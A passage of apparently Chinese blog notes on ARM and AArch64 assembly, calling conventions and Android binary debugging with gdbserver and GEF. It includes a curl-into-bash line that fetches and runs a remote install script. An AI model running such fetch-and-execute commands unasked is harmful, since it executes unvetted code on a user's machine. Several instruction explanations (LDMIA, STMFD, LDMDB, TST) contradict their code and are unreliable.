class="comment">//a.c</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(inta,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a-b;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">//a.h</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> ,<span class="type">int</span>)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">sub</span><span class="params">(<span class="type">int</span>,<span class="type">int</span>)</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="ARM架构函数调用约定">ARM架构函数调用约定</h3><p>AAPCS 是 ARM 架构的默认函数调用约定，适用于大多数 ARM 架构的编译器和操作系统。它定义了函数参数的传递方式、栈的使用规则以及寄存器的分配方式。</p><ul><li>参数传递：函数的<strong>前几个参数（通常是 R0、R1、R2、R3）通过寄存器传递</strong>，而剩余的参数通过栈传递。参数的传递顺序是<strong>从左到右</strong>。</li><li>栈的使用：栈用于保存局部变量、临时变量和函数调用过程中的状态。<strong>栈的增长方向是从高地址向低地址。</strong></li><li>寄存器的分配：除了用于参数传递的寄存器，还有一些寄存器被用作临时寄存器或保存特定的值，如栈指针（SP）、链接寄存器（LR）和程序计数器（PC）等。</li><li>堆栈的管理由<strong>被调用的函数负责</strong>。具体来说，堆栈的管理包括参数的压栈、局部变量的分配和释放、以及函数调用过程中的保存和恢复寄存器等。</li></ul><p>AAPCS-VFP 是在 AAPCS 的基础上添加了向量浮点扩展（Vector Floating-Point extension）的函数调用约定。它适用于需要使用浮点运算的函数。</p><ul><li>浮点参数传递：浮点参数通过浮点寄存器传递，通常是 S0、S1、S2、S3 等。如果参数个数超过了浮点寄存器的数量，剩余的参数通过栈传递。</li><li>浮点寄存器的使用：除了用于浮点参数传递的寄存器，还有一些寄存器被用作临时寄存器或保存特定的值，如浮点链接寄存器（LR）和浮点状态寄存器（FPSCR）等。</li></ul><h3 id="汇编指令">汇编指令</h3><h4 id="ARM中的寻址方式：">ARM中的寻址方式：</h4><p>寄存器移位寻址</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">r0</span>, <span class="built_in">r1</span>, <span class="keyword">lsl</span> <span class="number">#3</span>  将 <span class="built_in">R1</span> 左移 <span class="number">3</span> 位的结果移动到 <span class="built_in">R0</span> 中</span><br></pre></td></tr></table></figure><p>多寄存器寻址</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmia</span> <span class="built_in">r1</span>!, &#123;<span class="built_in">r2</span>-<span class="built_in">r7</span>, <span class="built_in">r12</span>&#125; 将 <span class="built_in">R1</span> 中的值加载到 <span class="built_in">R2</span>-<span class="built_in">R7</span> 和 <span class="built_in">R12</span> 中，然后将 <span class="built_in">R1</span> 加上 <span class="number">32</span>。</span><br></pre></td></tr></table></figure><p>堆栈寻址</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">stmfd</span> <span class="built_in">sp</span>!, &#123;<span class="built_in">r2</span>-<span class="built_in">r7</span>, <span class="built_in">lr</span>&#125;  将 <span class="built_in">R2</span>-<span class="built_in">R7</span>、<span class="built_in">LR</span> 的值存储到堆栈中，然后将 <span class="built_in">SP</span> 减去 <span class="number">24</span>。</span><br></pre></td></tr></table></figure><p>相对寻址</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">beq <span class="built_in">flag</span>   如果条件码为 EQ，则跳转到标签 <span class="built_in">flag</span> 处。</span><br><span class="line"><span class="built_in">flag</span>: </span><br></pre></td></tr></table></figure><h4 id="跳转指令">跳转指令</h4><p>B 强制跳转</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">B</span> <span class="selector-tag">label</span> ``//无条件跳转到标签 <span class="selector-tag">label</span> 处</span><br></pre></td></tr></table></figure><p>BL  带返回的跳转，将返回地址放入LR寄存器中</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BL label <span class="string">``</span><span class="comment">//跳转到标签 label 处，并将返回地址存储在 LR 中</span></span><br></pre></td></tr></table></figure><p>BLX   带返回和带状态的切换跳转指令  arm → thumb</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BLX label <span class="string">``</span><span class="comment">//跳转到标签 label 处，并将返回地址存储在 LR 中。可以实现 ARM 和 Thumb 之间的切换</span></span><br></pre></td></tr></table></figure><p>Bx  带状态的跳转</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BX</span> <span class="built_in">R1</span>  ``<span class="comment">// 跳转到地址存储在 R1 中的位置，并切换到相应的指令集模式</span></span><br></pre></td></tr></table></figure><h4 id="数据处理指令">数据处理指令</h4><p><strong>EOR</strong>：异或</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">EOR</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> ``//将 <span class="built_in">R1</span> 和 <span class="built_in">R2</span> 中的值进行按位异或操作，然后将结果存储到 <span class="built_in">R0</span> 中。</span><br></pre></td></tr></table></figure><p><strong>ORR</strong>：或</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ORR <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> ``//将 <span class="built_in">R1</span> 和 <span class="built_in">R2</span> 中的值进行按位或操作，然后将结果存储到 <span class="built_in">R0</span> 中。</span><br></pre></td></tr></table></figure><p><strong>BIC</strong>：与非 , 可以实现的 Bit Clear的功能</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">BIC</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#0xf</span> ``<span class="comment">//将 R1 和立即数 #0xf 进行按位与非操作，然后将结果存储到 R0 中。</span></span><br></pre></td></tr></table></figure><h4 id="乘法指令">乘法指令</h4><p>MLA  带加法的乘法:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MLA <span class="built_in">r0</span>,<span class="built_in">r1</span>,<span class="built_in">r2</span>,<span class="built_in">r3</span> ``//<span class="built_in">r0</span> = <span class="built_in">r1</span> * <span class="built_in">r2</span> + <span class="built_in">r3</span>  带加法的乘法</span><br></pre></td></tr></table></figure><p>SMULL  64位乘法:</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMULL <span class="built_in">r0</span>,<span class="built_in">r1</span> ,<span class="built_in">r2</span> ,<span class="built_in">r3</span> ``// <span class="built_in">r0</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的低<span class="number">32</span>位  <span class="built_in">r1</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的高<span class="number">32</span>位 </span><br></pre></td></tr></table></figure><p>SMLAL  64位带加法的乘法</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SMLAL <span class="built_in">r0</span>,<span class="built_in">r1</span> ,<span class="built_in">r2</span> ,<span class="built_in">r3</span> ``//<span class="built_in">r0</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的低<span class="number">32</span>位 + <span class="built_in">r0</span>  <span class="built_in">r1</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的高<span class="number">32</span>位 + <span class="built_in">r1</span> </span><br></pre></td></tr></table></figure><p>UMULL   64位无符号乘法</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMULL <span class="built_in">r0</span>,<span class="built_in">r1</span> ,<span class="built_in">r2</span> ,<span class="built_in">r3</span> ``// <span class="built_in">r0</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的低<span class="number">32</span>位  <span class="built_in">r1</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的高<span class="number">32</span>位 </span><br></pre></td></tr></table></figure><p>UMLAL 64位无符号带加法的乘法</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UMLAL  <span class="built_in">r0</span>,<span class="built_in">r1</span> ,<span class="built_in">r2</span> ,<span class="built_in">r3</span> ``//<span class="built_in">r0</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的低<span class="number">32</span>位 + <span class="built_in">r0</span>  <span class="built_in">r1</span> = (<span class="built_in">r2</span> * <span class="built_in">r3</span>)的高<span class="number">32</span>位 + <span class="built_in">r1</span> </span><br></pre></td></tr></table></figure><h4 id="移位操作">移位操作</h4><p><strong>LSL</strong>：逻辑左移指令，将寄存器中的值向左移动指定的位数，移动时右侧空出的位补零。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LSL</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#2</span> ``<span class="comment">// 将 R1 中的值左移 2 位，结果存储到 R0 中</span></span><br></pre></td></tr></table></figure><p><strong>LSR</strong>：逻辑右移指令，将寄存器中的值向右移动指定的位数，移动时左侧空出的位补零。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LSR</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#3</span> ``<span class="comment">// 将 R1 中的值右移 3 位，结果存储到 R0 中</span></span><br></pre></td></tr></table></figure><p><strong>ROR</strong>：循环右移指令，将寄存器中的值向右移动指定的位数，移动时左侧空出的位补上右侧的位。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ROR</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#4</span> ``<span class="comment">// 将 R1 中的值循环右移 4 位，结果存储到 R0 中</span></span><br></pre></td></tr></table></figure><p><strong>ASR</strong>：算术右移指令，将寄存器中的值向右移动指定的位数，移动时左侧空出的位补上符号位。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ASR</span> <span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#5</span> ``<span class="comment">// 将 R1 中的值算术右移 5 位，结果存储到 R0 中</span></span><br></pre></td></tr></table></figure><p><strong>RRX</strong>：扩展的循环右移指令，将寄存器中的值向右移动一位，同时将 C 标志位的值作为最低位插入到左侧</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">RRX</span> <span class="built_in">R0</span>, <span class="built_in">R1</span> ``<span class="comment">// 将 R1 中的值扩展的循环右移 1 位，结果存储到 R0 中</span></span><br></pre></td></tr></table></figure><h4 id="内存访问指令">内存访问指令</h4><p><strong>str    存储</strong></p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">STR <span class="built_in">R0</span>，[<span class="built_in">R1</span>]，＃<span class="number">8</span>   ``// 将<span class="built_in">R0</span>中的字数据写入以<span class="built_in">R1</span>为地址的存储器中，并将新地址<span class="built_in">R1</span>＋<span class="number">8</span>写入<span class="built_in">R1</span>。</span><br><span class="line">STR <span class="built_in">R0</span>，[<span class="built_in">R1</span>，＃<span class="number">8</span>]   ``// 将<span class="built_in">R0</span>中的字数据写入以<span class="built_in">R1</span>＋<span class="number">8</span>为地址的存储器中。”</span><br><span class="line">STR <span class="built_in">R1</span>, [<span class="built_in">r0</span>]     ``// 将<span class="built_in">r1</span>寄存器的值，传送到地址值为<span class="built_in">r0</span>的（存储器）内存中</span><br></pre></td></tr></table></figure><p><strong>ldr    读取</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>,<span class="number">=0x12</span> ``<span class="comment">//将0x12赋值给r0</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>, .lable1 ``<span class="comment">//获得.lable1的地址，存储在r0之中</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>,[<span class="built_in">r3</span>] ``<span class="comment">// r0 = *r3</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>,[<span class="built_in">r3</span>,<span class="number">#4</span>] ``<span class="comment">// r0 = *(r3 + 4)</span></span><br><span class="line"><span class="keyword">ldr</span> <span class="built_in">r0</span>,[<span class="built_in">r3</span>,<span class="built_in">r2</span>,<span class="keyword">LSL</span> <span class="number">#2</span>] ``<span class="comment">// r0 = *(r3+(r2 &lt;&lt; 2))</span></span><br></pre></td></tr></table></figure><p><strong>ldr与 str 指令的后缀与变种</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">在<span class="number">32</span>位中会读<span class="number">4</span>个字节 在<span class="number">64</span>位中会读<span class="number">8</span>个字节</span><br><span class="line">读取</span><br><span class="line"><span class="keyword">ldr</span> </span><br><span class="line"><span class="keyword">ldrb</span> ``<span class="comment">//读一个字节 一个字节的读取</span></span><br><span class="line"><span class="keyword">ldrh</span> ``<span class="comment">//读一个数 两个字节的读取</span></span><br><span class="line"><span class="keyword">ldm</span> ``<span class="comment">//批量进行处理 （根据一些组合有着不同的方式，后面写）</span></span><br><span class="line"></span><br><span class="line">存储</span><br><span class="line"><span class="keyword">str</span> ``<span class="comment">//四字节写入</span></span><br><span class="line"><span class="keyword">strb</span> ``<span class="comment">//一个字节写入</span></span><br><span class="line"><span class="keyword">strh</span> ``<span class="comment">//两个字节写入</span></span><br><span class="line"><span class="keyword">stm</span> ``<span class="comment">// 批量处理</span></span><br></pre></td></tr></table></figure><h4 id="比较寄存器的指令">比较寄存器的指令</h4><p><code>CMP</code> 比较两个操作数的值</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMP r<span class="number">1</span><span class="punctuation">,</span> <span class="variable">#10</span>  <span class="comment">; 比较寄存器 r1 的值和立即数 10</span></span><br><span class="line">BGT <span class="type">label</span>   <span class="comment">; 如果 r1 的值大于 10，则跳转到 label 处</span></span><br></pre></td></tr></table></figure><p><code>CMN</code> 比较两个操作数的值的补码</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CMN r<span class="number">2</span><span class="punctuation">,</span> <span class="variable">#5</span>  <span class="comment">; 比较寄存器 r2 的值的补码和立即数 5</span></span><br><span class="line">BLE <span class="type">label</span>   <span class="comment">; 如果 r2 的补码值小于或等于 5，则跳转到 label 处</span></span><br></pre></td></tr></table></figure><p><code>TST</code> 将两个操作数进行按位与运算，并根据结果设置条件码。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TST r<span class="number">3</span><span class="punctuation">,</span> <span class="variable">#0</span>xFF <span class="comment">; 检查寄存器 r3 的低八位是否全部为 1</span></span><br><span class="line">BEQ <span class="type">label</span>   <span class="comment">; 如果 r3 的低八位全为 1，则跳转到 label 处</span></span><br></pre></td></tr></table></figure><p><code>TEQ</code> 将两个操作数进行按位异或运算，并根据结果设置条件码。</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TEQ r<span class="number">4</span><span class="punctuation">,</span> <span class="variable">#0</span><span class="keyword">x</span><span class="number">80</span> <span class="comment">; 检查寄存器 r4 的值和立即数 0x80 的异或结果</span></span><br><span class="line">BNE <span class="type">label</span>   <span class="comment">; 如果 r4 的值与 0x80 异或后不为零，则跳转到 label 处</span></span><br></pre></td></tr></table></figure><p><img src="assets/image-20240429221534562.png" alt="image-20240429221534562"></p><h4 id="堆栈的指令组合后缀">堆栈的指令组合后缀</h4><h5 id="四种栈的类型">四种栈的类型</h5><p><strong>空栈</strong>：栈指针指向空位，每次存入时可以直接存入然后栈指针移动一格；而取出时需要先移动一格才能取出<br><strong>满栈</strong>：栈指针指向栈中最后一格数据，每次存入时需要先移动栈指针一格再存入；取出时可以直接取出，然后再移动栈指针</p><p><strong>增栈</strong>:栈指针移动时向地址增加的方向移动的栈<br><strong>减栈</strong>:栈指针移动时向地址减小的方向移动的栈</p><h5 id="针对此衍生出了8种后缀">针对此衍生出了8种后缀</h5><p><strong>ia（increase after</strong> :先传输，再地址+4<br><strong>ib（increase before</strong>  : 先地址+4，再传输<br><strong>da（decrease after</strong>: 先传输，再地址-4<br><strong>db（decrease befor</strong> :  先地址-4，再传输</p><p>fd（full decrease）:满递减堆栈<br>ed（empty decrease）:空递减堆栈<br>fa：满递增堆栈<br>ea：空递增堆栈</p><p><strong>在理解的时候我们就可以将其拆开理解，比如LDMIA   就是LDM  IA 两部分理解一些例子：</strong></p><p>从地址 r0 开始读取 4 个字（word），分别存储到 r1-r4 寄存器中，然后将地址 r0 增加 4。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDMIA</span> <span class="built_in">r0</span>!, &#123;<span class="built_in">r1</span>-<span class="built_in">r4</span>&#125;</span><br></pre></td></tr></table></figure><p>将地址 r0 增加 4，然后从新地址开始读取 3 个字，分别存储到 r1-r3 寄存器中。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDMIB</span> <span class="built_in">r0</span>, &#123;<span class="built_in">r1</span>-<span class="built_in">r3</span>&#125;</span><br></pre></td></tr></table></figure><p>从地址 r0 开始读取 2 个字，分别存储到 r1-r2 寄存器中，然后将地址 r0 减少 4，并将读取的最后一个字存储到 lr 寄存器中。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">STMFD</span> <span class="built_in">sp</span>!, &#123;<span class="built_in">r1</span>-<span class="built_in">r3</span>, <span class="built_in">lr</span>&#125;</span><br></pre></td></tr></table></figure><p>将 r1-r3 寄存器中的数据存储到地址 sp 指向的存储器中，然后将 sp 减少 16（4 个字），并将 lr 寄存器中的数据存储到新的地址 sp 指向的存储器中。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDMDB</span> <span class="built_in">r0</span>!, &#123;<span class="built_in">r1</span>-<span class="built_in">r2</span>, <span class="built_in">lr</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="指令中！的作用">指令中！的作用</h4><p>一般的，当感叹号 “!” 出现在寄存器名称后面时，就表示在执行指令后会更新该寄存器的值。如果没有！，表示执行指令前不更新该寄存器的值。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmia</span>  <span class="built_in">r0</span>, &#123;<span class="built_in">r2</span> - <span class="built_in">r3</span>&#125;``<span class="keyword">ldmia</span>  <span class="built_in">r0</span>！, &#123;<span class="built_in">r2</span> - <span class="built_in">r3</span>&#125;</span><br></pre></td></tr></table></figure><p>这里感叹号的作用就是r0的值在ldm过程中发生的增加或者减少最后写回到r0去，第二句的ldm时会改变r0的值，而第一句，没有!，运行之后不会更新 r0 的值</p><h4 id="指令中-的作用">指令中^的作用</h4><p>^的作用：在目标寄存器中有pc时，会同时将spsr写入到cpsr，一般用于从异常模式返回。</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ldmfd</span>  <span class="built_in">sp</span>!, &#123;<span class="built_in">r0</span> - <span class="built_in">r6</span>, <span class="built_in">pc</span>&#125;``<span class="keyword">ldmfd</span>  <span class="built_in">sp</span>!, &#123;<span class="built_in">r0</span> - <span class="built_in">r6</span>, <span class="built_in">pc</span>&#125;^</span><br></pre></td></tr></table></figure><h4 id="汇编不同写法，对于寄存器的改变-先算括号）">汇编不同写法，对于寄存器的改变(先算括号）</h4><p><strong>偏移量方法</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R0</span>,[<span class="built_in">R1</span>, <span class="number">#4</span>]</span><br></pre></td></tr></table></figure><p>实现的操作：</p><p>r0= *(r1 + 4)</p><p><strong>事先更新</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R0</span>,[<span class="built_in">R1</span>, <span class="number">#4</span>]!</span><br></pre></td></tr></table></figure><p>实现的操作：</p><p>r0 = *（r1 + 4)</p><p>r1 = r1 +4</p><p><strong>事后更新:</strong></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR</span> <span class="built_in">R0</span>,[<span class="built_in">R1</span>], <span class="number">#4</span></span><br></pre></td></tr></table></figure><p>实现的操作：</p><p>r0=*r1<br>r1=r1+4</p><h3 id="gdb调试arm文件">gdb调试arm文件</h3><p>安装gdb-multiarch</p><p><code>sudo apt-get install gdb-multiarch </code></p><p>安装gef插件</p><p><a href="https://github.com/hugsy/gef">https://github.com/hugsy/gef</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://gef.blah.cat/sh)</span>&quot;</span></span><br></pre></td></tr></table></figure><p>这里一系列报错我是通过下面博客进行安装gef<br><a href="https://www.cnblogs.com/liulianzhen99/articles/17824258.html">gdb exhanced features(GEF)工具的使用 - 寻梦99 - 博客园 (cnblogs.com)</a></p><p>因为要调试arm手机端的文件，所以手机上安装一个gdbserver，ndk也有</p><p>在ndk目录中 <code>find . -name gdbserver</code>找到路径</p><p>然后推送至手机当中</p><p><code>adb push ./prebuilt/android-arm/gdbserver/gdbserver /data/local/tmp/gdbserver32</code></p><p><strong>开启gdbserver</strong>  监听端口</p><p><code>/data/local/tmp/gdbserver32:11678 /data/local/tmp/hello</code></p><p><strong>转发到本机</strong></p><p><code>adb forward tcp:11678 tcp:11678</code></p><p><strong>gdb连接这个端口</strong></p><p><code>gef-remote localhost 11678</code></p><p><img src="assets/image-20240207153505987.png" alt="image-20240207153505987"></p><p>gdb简单使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>.断点</span><br><span class="line"><span class="selector-tag">b</span> + 标签名</span><br><span class="line"><span class="selector-tag">b</span> + *地址</span><br><span class="line"><span class="number">2</span>.单步调试</span><br><span class="line">n 源代码</span><br><span class="line">ni 汇编代码</span><br><span class="line"><span class="number">3</span>.步入</span><br><span class="line">si</span><br><span class="line"><span class="number">4</span>.打印指定汇编</span><br><span class="line">disassemble <span class="selector-tag">main</span></span><br><span class="line"><span class="number">5</span>.继续执行</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>r0,r1,r2,r3来传参，参数大于四个用栈传参</p><p>hexdump byte + 地址：打印地址内容</p><h3 id="一些arm指令">一些arm指令</h3><ul><li>数据加载与存储指令<br>LDMIA  SP，{r0,r1,r2}<br>r0=sp[0]<br>r1=sp[4]<br>r2=sp[8]<br>STMIA SP，{r0,r1,r2}<br>r0,r1,r2存入sp栈中</li><li>指令中断<br>svc=swi<br>svc 0 == syscall</li></ul><h3 id="ARM架构参考手册">ARM架构参考手册</h3><p>查看手机架构 <code>getprop | grep abi</code></p><h2 id="Thumb">Thumb</h2><p><code>clang -target armv7a-linux-androideabi29 -mthumb -S 4.c -o 4.s</code></p><p>编译为thumb模式汇编</p><h2 id="AArch64">AArch64</h2><p>arm64有31寄存器：x0-x30/w0-w30</p><p>前八个寄存器用来传参，多于8个参数就用栈</p><p>寄存器R8：当函数返回值长度大于64时候，用R8存函数返回值地址，不大于64时用R0</p><p><code>clang -target aarch64-linux-androideabi29 -mthumb -S 4.c -o 4.s</code></p><h2 id="c逆向">c逆向</h2><h4 id="数据类型">数据类型</h4><p><strong>float</strong></p><p>float a = 7.0f 在汇编代码中7.0f表示为0x40e00000</p><p>原理：7.0 ==》1.11* 2^2</p><p>指数：127+2=129 ==》1000 0001</p><p>符号位：整数 0</p><p>小数位：11 后面补0</p><p>所以二进制形式 0 1000 0001 11000000000000000000000 ==》即0x40e00000</p><p><strong>double</strong></p><p>double b=9.0在汇编代码中表示为0x4022 0000 0000 0000</p><p>原理：9.0 ==》1.001*2^3</p><p>指数：1023+3=1026 ==》100 0000 0010</p><p>小数位：0010 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000</p><p>所以二进制形式 0 10000000010 0010000000000000000000000000000000000000000000000000 =》0x4022 000000000000</p><h4 id="运算符">运算符</h4><p>1)乘法<br>乘以一个数，这个数是2的次方，就用lsl来计算。</p><p>smull r3,r12,r0,r1   ==&gt;r3存放r0 x r1低位 r12存高位</p><h4 id="函数">函数</h4><p>参数小于4的时候用R0-R3传参，多于4用栈传参</p><p>.init_array 给函数一个属性 <code>__attribute__((constructor))</code>;</p><h2 id="c">c++</h2><p>c++filt解析C++的函数名称</p><p>编译</p><p><code>clang++ -target armv7a-linux-androideabi29 xxx.cpp -o xxx -static-libstdc++</code></p><p>去符号表 strip 找到NDK包下的strip</p><p><code>strip 可执行文件名</code></p><h2 id="内联汇编">内联汇编</h2><p>NDK开发：在android studio中 的cpp文件中</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//arm32</span></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="title">test_asm</span><span class="params">(<span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> m=<span class="number">0</span>;</span><br><span class="line">    __asm__(<span class="string">&quot;mov r0, %[input_n]\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;add r0, r0\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %[result_m], r0\r\n&quot;</span></span><br><span class="line">            :[result_m] <span class="string">&quot;=r&quot;</span> (m)</span><br><span class="line">            :[input_n] <span class="string">&quot;r&quot;</span> (n)</span><br><span class="line">           );</span><br><span class="line">    <span class="keyword">return</span> m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//再在主函数中调用</span></span><br></pre></td></tr></table></figure><p>Aarch64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">long</span> <span class="title">test_asm</span><span class="params">(<span class="type">long</span> n)</span></span>&#123;</span><br><span class="line">    <span class="type">long</span> m=<span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> __arm__</span></span><br><span class="line"> __asm__(<span class="string">&quot;mov r0, %[input_n]\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;add r0, r0\r\n&quot;</span></span><br><span class="line">            <span class="string">&quot;mov %[result_m], r0\r\n&quot;</span></span><br><span class="line">            :[result_m] <span class="string">&quot;=r&quot;</span> (m)</span><br><span class="line">            